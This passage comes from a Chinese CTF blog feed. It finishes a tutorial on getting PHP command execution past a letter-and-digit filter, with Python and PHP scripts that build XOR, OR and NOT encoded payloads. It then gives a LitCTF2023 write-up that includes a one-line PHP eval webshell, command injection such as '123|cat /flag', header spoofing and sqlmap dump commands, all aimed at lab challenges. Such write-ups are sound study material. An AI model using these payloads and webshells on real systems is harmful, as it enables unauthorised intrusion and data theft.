data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">while</span> True:</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>       <span class=\"token assign-left variable\">param</span><span class=\"token operator\">=</span>action<span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">(</span><span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span>[+] your function：\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>+action<span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] your command：\"</span><span class=\"token punctuation\">))</span>+<span class=\"token string\">\";\"</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>       print<span class=\"token punctuation\">(</span>param<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>执行结果</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token string\">\"%08%02%08%08%05%0d\"</span>^<span class=\"token string\">\"%7b%7b%7b%7c%60%60\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%0c%08\"</span>^<span class=\"token string\">\"%60%7b\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"http://k1nako-images.netlify.app/images/image-20230521235357605.png\" alt=\"image-20230521235357605\" /></p>\n<h4 id=\"或\"><a class=\"anchor\" href=\"#或\">#</a> 或</h4>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&lt;</span>?php</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$myfile</span> <span class=\"token operator\">=</span> fopen<span class=\"token punctuation\">(</span><span class=\"token string\">\"huo.txt\"</span>, <span class=\"token string\">\"w\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token variable\">$contents</span><span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span>++<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$j</span> <span class=\"token operator\">&lt;</span><span class=\"token number\">256</span> <span class=\"token punctuation\">;</span> <span class=\"token variable\">$j</span>++<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        if<span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>          <span class=\"token variable\">$hex_i</span><span class=\"token operator\">=</span><span class=\"token string\">'0'</span>.dechex<span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        else<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>          <span class=\"token variable\">$hex_i</span><span class=\"token operator\">=</span>dechex<span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        if<span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span><span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>          <span class=\"token variable\">$hex_j</span><span class=\"token operator\">=</span><span class=\"token string\">'0'</span>.dechex<span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        else<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>          <span class=\"token variable\">$hex_j</span><span class=\"token operator\">=</span>dechex<span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token variable\">$preg</span> <span class=\"token operator\">=</span> <span class=\"token string\">'/[0-9a-z]/i'</span><span class=\"token punctuation\">;</span>//根据题目给的正则表达式修改即可</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        if<span class=\"token punctuation\">(</span>preg_match<span class=\"token punctuation\">(</span><span class=\"token variable\">$preg</span> , hex2bin<span class=\"token punctuation\">(</span><span class=\"token variable\">$hex_i</span><span class=\"token punctuation\">))</span><span class=\"token operator\">||</span>preg_match<span class=\"token punctuation\">(</span><span class=\"token variable\">$preg</span> , hex2bin<span class=\"token punctuation\">(</span><span class=\"token variable\">$hex_j</span><span class=\"token punctuation\">))</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>              <span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      </pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        else<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string\">'%'</span><span class=\"token builtin class-name\">.</span><span class=\"token variable\">$hex_i</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token string\">'%'</span><span class=\"token builtin class-name\">.</span><span class=\"token variable\">$hex_j</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>urldecode<span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token operator\">|</span>urldecode<span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">))</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>ord<span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token operator\">>=</span><span class=\"token number\">32</span><span class=\"token operator\">&amp;</span>ord<span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;=</span><span class=\"token number\">126</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>          <span class=\"token variable\">$contents</span><span class=\"token operator\">=</span><span class=\"token variable\">$contents</span><span class=\"token builtin class-name\">.</span><span class=\"token variable\">$c</span><span class=\"token builtin class-name\">.</span><span class=\"token string\">\" \"</span><span class=\"token builtin class-name\">.</span><span class=\"token variable\">$a</span><span class=\"token builtin class-name\">.</span><span class=\"token string\">\" \"</span><span class=\"token builtin class-name\">.</span><span class=\"token variable\">$b</span><span class=\"token builtin class-name\">.</span><span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    fwrite<span class=\"token punctuation\">(</span><span class=\"token variable\">$myfile</span>,<span class=\"token variable\">$contents</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    fclose<span class=\"token punctuation\">(</span><span class=\"token variable\">$myfile</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>python 脚本生成 payload</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">import</span> urllib</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>from sys <span class=\"token function\">import</span> *</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">import</span> os</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>def action<span class=\"token punctuation\">(</span>arg<span class=\"token punctuation\">)</span>:</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>       <span class=\"token assign-left variable\">s1</span><span class=\"token operator\">=</span><span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>       <span class=\"token assign-left variable\">s2</span><span class=\"token operator\">=</span><span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>       <span class=\"token keyword\">for</span> <span class=\"token for-or-select variable\">i</span> <span class=\"token keyword\">in</span> arg:</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>           <span class=\"token assign-left variable\">f</span><span class=\"token operator\">=</span>open<span class=\"token punctuation\">(</span><span class=\"token string\">\"huo.txt\"</span>,<span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>           <span class=\"token keyword\">while</span> True:</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>               <span class=\"token assign-left variable\">t</span><span class=\"token operator\">=</span>f.readline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>               <span class=\"token keyword\">if</span> <span class=\"token assign-left variable\">t</span><span class=\"token operator\">==</span><span class=\"token string\">\"\"</span><span class=\"token builtin class-name\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                   <span class=\"token builtin class-name\">break</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>               <span class=\"token keyword\">if</span> t<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>i:</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                   <span class=\"token comment\">#print(i)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                   <span class=\"token assign-left variable\">s1</span><span class=\"token operator\">+=</span>t<span class=\"token punctuation\">[</span><span class=\"token number\">2</span>:5<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                   <span class=\"token assign-left variable\">s2</span><span class=\"token operator\">+=</span>t<span class=\"token punctuation\">[</span><span class=\"token number\">6</span>:9<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                   <span class=\"token builtin class-name\">break</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>           f.close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>       <span class=\"token assign-left variable\">output</span><span class=\"token operator\">=</span><span class=\"token string\">\"(<span class=\"token entity\" title=\"\\&quot;\">\\\"</span>\"</span>+s1+<span class=\"token string\">\"<span class=\"token entity\" title=\"\\&quot;\">\\\"</span>|<span class=\"token entity\" title=\"\\&quot;\">\\\"</span>\"</span>+s2+<span class=\"token string\">\"<span class=\"token entity\" title=\"\\&quot;\">\\\"</span>)\"</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>       return<span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>       </pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">while</span> True:</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>       <span class=\"token assign-left variable\">param</span><span class=\"token operator\">=</span>action<span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">(</span><span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span>[+] your function：\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>+action<span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] your command：\"</span><span class=\"token punctuation\">))</span>+<span class=\"token string\">\";\"</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>       print<span class=\"token punctuation\">(</span>param<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>执行结果</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token string\">\"%08%02%08%08%05%0d\"</span>^<span class=\"token string\">\"%7b%7b%7b%7c%60%60\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%0c%08\"</span>^<span class=\"token string\">\"%60%7b\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"http://k1nako-images.netlify.app/images/image-20230522000024700.png\" alt=\"image-20230522000024700\" /></p>\n<h4 id=\"取反\"><a class=\"anchor\" href=\"#取反\">#</a> 取反</h4>\n<p>直接用 php 脚本生成 payload</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&lt;</span>?php  //在命令行中运行</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>fwrite<span class=\"token punctuation\">(</span>STDOUT,<span class=\"token string\">'[+]your function: '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$system</span><span class=\"token operator\">=</span>str_replace<span class=\"token punctuation\">(</span>array<span class=\"token punctuation\">(</span><span class=\"token string\">\"<span class=\"token entity\" title=\"\\r\">\\r</span><span class=\"token entity\" title=\"\\n\">\\n</span>\"</span>, <span class=\"token string\">\"<span class=\"token entity\" title=\"\\r\">\\r</span>\"</span>, <span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span>\"</span><span class=\"token punctuation\">)</span>, <span class=\"token string\">\"\"</span>, fgets<span class=\"token punctuation\">(</span>STDIN<span class=\"token punctuation\">))</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>fwrite<span class=\"token punctuation\">(</span>STDOUT,<span class=\"token string\">'[+]your command: '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$command</span><span class=\"token operator\">=</span>str_replace<span class=\"token punctuation\">(</span>array<span class=\"token punctuation\">(</span><span class=\"token string\">\"<span class=\"token entity\" title=\"\\r\">\\r</span><span class=\"token entity\" title=\"\\n\">\\n</span>\"</span>, <span class=\"token string\">\"<span class=\"token entity\" title=\"\\r\">\\r</span>\"</span>, <span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span>\"</span><span class=\"token punctuation\">)</span>, <span class=\"token string\">\"\"</span>, fgets<span class=\"token punctuation\">(</span>STDIN<span class=\"token punctuation\">))</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token string\">'[*] (~'</span>.urlencode<span class=\"token punctuation\">(</span>~<span class=\"token variable\">$system</span><span class=\"token punctuation\">)</span>.<span class=\"token string\">')(~'</span>.urlencode<span class=\"token punctuation\">(</span>~<span class=\"token variable\">$command</span><span class=\"token punctuation\">)</span>.<span class=\"token string\">');'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>?<span class=\"token operator\">></span></pre></td></tr></table></figure><p><img data-src=\"http://k1nako-images.netlify.app/images/image-20230522000359085.png\" alt=\"image-20230522000359085\" /></p>\n<h5 id=\"例题-3\"><a class=\"anchor\" href=\"#例题-3\">#</a> 例题</h5>\n<p><strong>NSSCTF</strong></p>\n<p>[SWPUCTF 2021 新生赛] hardrce</p>\n",
            "tags": [
                "知识点总结补档系列",
                "CTF"
            ]
        },
        {
            "id": "http://k1nako.github.io/LitCTF2023%E9%83%A8%E5%88%86wp/",
            "url": "http://k1nako.github.io/LitCTF2023%E9%83%A8%E5%88%86wp/",
            "title": "LitCTF2023部分wp",
            "date_published": "2023-05-13T04:45:57.000Z",
            "content_html": "<p>LitCTF2023 部分 wp</p>\n<p><span id=\"more\"></span></p>\n<p>简单题一并拿下，难题一律不会 www<br />\n 总的来说难度是低的，不亏是新生赛，对于我这个小白来说可太有体验感了<br />\n是我太笨逼了，没有 AK 掉 web，赛后看 wp 肠子都悔了 55555<br />\n 以此表扬 (xxxx</p>\n<h1 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> WEB</h1>\n<h2 id=\"我flag呢\"><a class=\"anchor\" href=\"#我flag呢\">#</a> ▸ 我 Flag 呢？</h2>\n<p>源代码搜索 flag</p>\n<h2 id=\"导弹迷踪\"><a class=\"anchor\" href=\"#导弹迷踪\">#</a> ▸ 导弹迷踪</h2>\n<p>游戏题</p>\n<p>在  <code>/src/game.js</code>  文件找到 flag</p>\n<p><img data-src=\"http://k1nako-images.netlify.app/images/image-20230513130612563.png\" alt=\"image-20230513130612563\" /></p>\n<h2 id=\"follow-me-and-hack-me\"><a class=\"anchor\" href=\"#follow-me-and-hack-me\">#</a> ▸ Follow me and hack me</h2>\n<p>根据提示</p>\n<p><img data-src=\"http://k1nako-images.netlify.app/images/image-20230513125818991.png\" alt=\"image-20230513125818991\" /></p>\n<p>get 和 post 传参即可</p>\n<pre><code>payload\nGET:CTF=Lit2023\nPOST:Challenge=i'm_c0m1ng\n</code></pre>\n<h2 id=\"ping\"><a class=\"anchor\" href=\"#ping\">#</a> ▸ Ping</h2>\n<p>尝试 || &amp;&amp; 绕过</p>\n<p>发现有前端 ip 检测</p>\n<pre><code> function check_ip()&#123;\n    let ip = document.getElementById('command').value;\n    let re = /^(25[0-5]|2[0-4]\\d|[0-1]\\d&#123;2&#125;|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d&#123;2&#125;|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d&#123;2&#125;|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d&#123;2&#125;|[1-9]?\\d)$/;\n\n    if(re.test(ip.trim()))&#123;\n      return true;\n    &#125;\n    alert('敢于尝试已经是很厉害了，如果是这样的话，就只能输入ip哦');\n    return false;\n  &#125;\n</code></pre>\n<p>尝试修改前端代码尝试绕过，发现无效（可能是我菜</p>\n<p>这时候就已经没思路了，百度搜索小知识发现可以在控制台覆盖原始函数的方法</p>\n<pre><code>check_ip = function() &#123;\n    return true;\n&#125;;\n</code></pre>\n<p>尝试  <code>123|ls</code></p>\n<p><img data-src=\"http://k1nako-images.netlify.app/images/image-20230513125429555.png\" alt=\"image-20230513125429555\" /></p>\n<p>可以看出有回显，说明成功绕过了</p>\n<pre><code>payload\n123|cat /flag\n</code></pre>\n<p>得到 flag</p>\n<h2 id=\"php是世界上最好的语言\"><a class=\"anchor\" href=\"#php是世界上最好的语言\">#</a> ▸ PHP 是世界上最好的语言！！</h2>\n<p>直接输入指令查看即可</p>\n<p><img data-src=\"http://k1nako-images.netlify.app/images/image-20230514110910019.png\" alt=\"image-20230514110910019\" /></p>\n<h2 id=\"作业管理系统\"><a class=\"anchor\" href=\"#作业管理系统\">#</a> ▸ 作业管理系统</h2>\n<p>源代码藏有默认密码 admin\\admin</p>\n<p>看到上传文件，尝试上传个一句话木马</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'K1nako'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>尝试访问，发现有回显值，上传成功了（蚁剑连接同理，（懒得开蚁剑 x<img data-src=\"http://k1nako-images.netlify.app/images/image-20230513135226825.png\" alt=\"image-20230513135226825\" /></p>\n<pre><code>payload\nK1nako=system('cat /flag');\n</code></pre>\n<p>得到 flag</p>\n<h2 id=\"vim-yyds\"><a class=\"anchor\" href=\"#vim-yyds\">#</a> ▸ Vim yyds</h2>\n<p>根据题目提示：漏... 漏了！</p>\n<p>盲猜一个 swp 临时文件泄露</p>\n<p>利用目录扫描工具一扫果然如此</p>\n<p><img data-src=\"http://k1nako-images.netlify.app/images/image-20230513140923005.png\" alt=\"image-20230513140923005\" /></p>\n<p>将 swp 文件下载下来拖到 linux 系统里输入指令 <code>vim -r index.php.swp</code></p>\n<p>就可修复文件</p>\n<p><img data-src=\"http://k1nako-images.netlify.app/images/image-20230513140948186.png\" alt=\"image-20230513140948186\" /></p>\n<p>可以看到，里面藏了后门代码，通过 post 方式传参 password，这就好办了</p>\n<p>将 <code>Give_Me_Your_Flag</code>  base64 加密然后传参得到回显</p>\n<p><img data-src=\"http://k1nako-images.netlify.app/images/image-20230513141219344.png\" alt=\"image-20230513141219344\" /></p>\n<pre><code>payload\nPOST:password=R2l2ZV9NZV9Zb3VyX0ZsYWc=&amp;cmd=cat /flag\n</code></pre>\n<p>得到 flag</p>\n<h2 id=\"这是什么sql-注一下\"><a class=\"anchor\" href=\"#这是什么sql-注一下\">#</a> ▸ 这是什么？SQL ！注一下 ！</h2>\n<p>打开是一个搜索框，根据题目考点是 sql</p>\n<p>直接 sqlmap 跑起来</p>\n<p><code>sqlmap -u &quot;http://node5.anna.nssctf.cn:28399/?id=id%3D1&quot; --dbs </code>  跑数据库</p>\n<p><img data-src=\"http://k1nako-images.netlify.app/images/image-20230513145426869.png\" alt=\"image-20230513145426869\" /></p>\n<p><code>sqlmap -u &quot;http://node5.anna.nssctf.cn:28399/?id=id%3D1&quot; -D ctf --tables </code>  爆数据库表名</p>\n<p><img data-src=\"http://k1nako-images.netlify.app/images/image-20230513145539331.png\" alt=\"image-20230513145539331\" /></p>\n<p><code>sqlmap -u &quot;http://node5.anna.nssctf.cn:28399/?id=id%3D1&quot; -D ctf -T users --columns </code>  爆数据库表字段</p>\n<p><img data-src=\"http://k1nako-images.netlify.app/images/image-20230513150150040.png\" alt=\"image-20230513150150040\" /></p>\n<p><code>sqlmap -u &quot;http://node5.anna.nssctf.cn:28399/?id=id%3D1&quot; -D ctf -T users -C password --dump  </code>  爆字段内容，发现了 flag...... 的第四部分？？？？（补充，这是彩蛋</p>\n<p><img data-src=\"http://k1nako-images.netlify.app/images/image-20230513150734527.png\" alt=\"image-20230513150734527\" /></p>\n<p>换个数据库接着跑，就算是四个部分也得跑出来 hhh</p>\n<p>不出所料在 <code>ctftraining/flag/flag</code>  爆出了真正的 flag</p>\n<p><img data-src=\"http://k1nako-images.netlify.app/images/image-20230513152632184.png\" alt=\"image-20230513152632184\" /></p>\n<pre><code>payload\nsqlmap -u &quot;http://node5.anna.nssctf.cn:28399/?id=id%3D1&quot; -D ctftraining -T flag -C flag --dump\n</code></pre>\n<h2 id=\"http-pro-max-plus\"><a class=\"anchor\" href=\"#http-pro-max-plus\">#</a> ▸ Http pro max plus</h2>\n<p>打开只允许本地访问</p>\n<p>利用 xff，突然被骂 (x</p>\n<p><img data-src=\"http://k1nako-images.netlify.app/images/image-20230513153818472.png\" alt=\"image-20230513153818472\" /></p>\n<p>那就换个伪造  <code>client-ip:127.0.0.1</code>  然后回显了奇怪的东西</p>\n<p><img data-src=\"http://k1nako-images.netlify.app/images/image-20230513160719587.png\" alt=\"image-20230513160719587\" /></p>\n<p><code>Referer:pornhub.com</code></p>\n<p><img data-src=\"http://k1nako-images.netlify.app/images/image-20230513160827138.png\" alt=\"image-20230513160827138\" /></p>\n<p><code>Via:Clash.win</code></p>\n<p>终于在我的不懈努力，百度翻了又翻，试了又试，给我试出来了</p>\n<p><img data-src=\"http://k1nako-images.netlify.app/images/image-20230513163534434.png\" alt=\"image-20230513163534434\" /></p>\n<p>我替你们点了一下，都不是什么好东西 (x</p>\n<p><img data-src=\"http://k1nako-images.netlify.app/images/image-20230513163930091.png\" alt=\"image-20230513163930091\" /></p>\n<p>看了一眼源代码才发现 hint 藏在这里面</p>\n<p><code> &lt;!--你就冲吧，什么都冲只会害了你自己 bdy好康的在 /sejishikong.php--&gt;</code></p>\n<p>访问  <code>//sejishikong.php</code>  得到 flag</p>\n<h2 id=\"彩蛋\"><a class=\"anchor\" href=\"#彩蛋\">#</a> ▸ 彩蛋</h2>\n<p>我是没想到，前面找到的分部 flag 居然是彩蛋 www</p>\n<p><strong>我 Flag 呢</strong> flag 藏在  <code>assets/js/script.min.js</code>   第一个彩蛋   <code>LitCTF&#123;First_t0_The_k3y!</code></p>\n<p><strong>作业管理系统</strong>    远程登陆下面有个连接，浏览器打开即可 第二个彩蛋  <code>_S0_ne3t?</code></p>\n<p><strong>Follow me and hack me</strong>   备份文件  <code>www.zip</code> \t\t第三个彩蛋  <code>_R3ady_Pl4yer_000ne_</code></p>\n<p><strong>这是什么？SQL ！注一下 ！</strong>   <code>ctf/users/password</code>  \t第四个彩蛋   <code>F1rst_to_Th3_eggggggggg!&#125;</code></p>\n<h1 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> MISC</h1>\n<h2 id=\"签到初级\"><a class=\"anchor\" href=\"#签到初级\">#</a> ▸ 签到！(初级)</h2>\n<p>关注公众号。签到</p>\n<h2 id=\"what_1s_base-初级\"><a class=\"anchor\" href=\"#what_1s_base-初级\">#</a> ▸ What_1s_BASE (初级)</h2>\n<p>base64 解码即可</p>\n<h2 id=\"take-me-hand-初级\"><a class=\"anchor\" href=\"#take-me-hand-初级\">#</a> ▸ Take me hand (初级)</h2>\n<p>Wireshark 打开</p>\n<p>全都是 ssh 协议，过滤器填入 ssh 过滤一下</p>\n<p>右键第一个 ssh 协议跟踪 TCP 流查看</p>\n<p>在流 1 找到 flag</p>\n<p><img data-src=\"http://k1nako-images.netlify.app/images/image-20230513185625163.png\" alt=\"image-20230513185625163\" /></p>\n<h2 id=\"404notfound-初级\"><a class=\"anchor\" href=\"#404notfound-初级\">#</a> ▸ 404notfound (初级)</h2>\n<p>下载附件，010editor 打开，发现 flag</p>\n<h2 id=\"喜欢我的压缩包么-初级\"><a class=\"anchor\" href=\"#喜欢我的压缩包么-初级\">#</a> ▸ 喜欢我的压缩包么 (初级)</h2>\n<p>下载附件，根据题目提示，密码六位数，爆破得到密码</p>\n<p><img data-src=\"http://k1nako-images.netlify.app/images/image-20230513190107133.png\" alt=\"image-20230513190107133\" /></p>\n<p>解压得到 flag</p>\n<h2 id=\"这羽毛球怎么只有一半啊恼-初级\"><a class=\"anchor\" href=\"#这羽毛球怎么只有一半啊恼-初级\">#</a> ▸ 这羽毛球怎么只有一半啊（恼 (初级)</h2>\n<p>下载附件，根据题目提示，将图片拖进 010editor</p>\n<p>修改高度，查看图片即可得到 flag<img data-src=\"http://k1nako-images.netlify.app/images/image-20230513190610080.png\" alt=\"image-20230513190610080\" /></p>\n<h2 id=\"破损的图片初级\"><a class=\"anchor\" href=\"#破损的图片初级\">#</a> ▸ 破损的图片 (初级)</h2>\n<p>下载附件发现没有后缀名，拖进 010editor 查看文件头被删掉了，文件尾 AE426082，确定为 PNG 文件</p>\n<p><img data-src=\"http://k1nako-images.netlify.app/images/image-20230513191308312.png\" alt=\"image-20230513191308312\" /></p>\n<p>修改完后查看图片即可得到 flag</p>\n<h1 id=\"crypto\"><a class=\"anchor\" href=\"#crypto\">#</a> Crypto</h1>\n<h2 id=\"hexhex初级\"><a class=\"anchor\" href=\"#hexhex初级\">#</a> ▸ Hex？Hex！(初级)</h2>\n<p>hex 解码</p>\n<h2 id=\"梦想是红色的-初级\"><a class=\"anchor\" href=\"#梦想是红色的-初级\">#</a> ▸ 梦想是红色的 